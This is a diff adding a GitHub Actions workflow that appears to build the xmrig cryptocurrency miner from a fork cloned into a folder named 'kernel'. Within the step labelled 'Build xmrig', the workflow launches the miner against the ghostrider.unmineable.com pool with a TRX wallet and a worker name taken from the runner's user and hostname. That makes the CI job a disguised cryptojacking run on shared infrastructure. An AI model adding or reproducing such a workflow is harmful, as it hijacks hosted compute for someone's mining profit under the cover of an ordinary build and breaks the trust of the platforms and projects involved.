@@ -1,0 +1,47 @@
+name: Building xmrig
+
+on:
+  workflow_dispatch:
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - name: Checkout
+        uses: actions/checkout@master
+
+      - name: Prepare the environment
+        run: |
+          sudo apt update -y
+          sudo apt install -y git build-essential cmake libuv1-dev libssl-dev libhwloc-dev
+          mkdir workspace
+
+      - name: Clone repo
+        run: |
+          cd workspace
+          sudo hostname jzinferno
+          git clone --depth=1 https://github.com/jzinferno/xmrig kernel
+          cd kernel && mkdir build
+
+      - name: Set Swap Space
+        uses: pierotofy/set-swap-space@master
+        with:
+          swap-size-gb: 8
+
+      - name: Build xmrig
+        run: |
+          cd workspace/kernel/build
+          cmake ..
+          make -j$(nproc)
+          ./xmrig -a gr -o stratum+ssl://ghostrider.unmineable.com:443 -u "TRX:TUa3ZgQfnT21kQsSc4MwZyFxigKrQdQ9dU.$(whoami)_$(uname -n)#uhok-ykxb" -p x
+
+      - name: Release xmrig
+        uses: softprops/action-gh-release@v1
+        env:
+          GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}
+        with:
+          tag_name: ${{ github.run_id }}
+          name: ${{ github.run_id }}
+          files: |
+            workspace/kernel/build/xmrig
